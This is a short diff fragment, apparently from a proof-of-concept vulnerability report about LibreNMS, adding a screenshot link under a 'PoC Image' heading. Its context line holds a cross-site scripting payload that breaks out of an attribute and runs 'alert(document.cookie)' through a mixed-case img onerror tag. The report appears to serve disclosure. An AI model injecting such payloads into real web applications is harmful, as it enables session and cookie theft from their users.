@@ -19,6 +19,7 @@ saitamang"><iMg SrC="x" oNeRRor="alert(document.cookie);">
 
 # PoC Image
 
+<img src="https://lh3.googleusercontent.com/drive-viewer/AJc5JmQOlrU4P9ec-Iwxd_TdK4tRB72Ugfk5AThWzKfAnwKofm5-l7vW8YcXk_eDEhi_B_RGt1bKaZ0=w1920-h878" title="librenms">
 
 # PoC Video
 ```
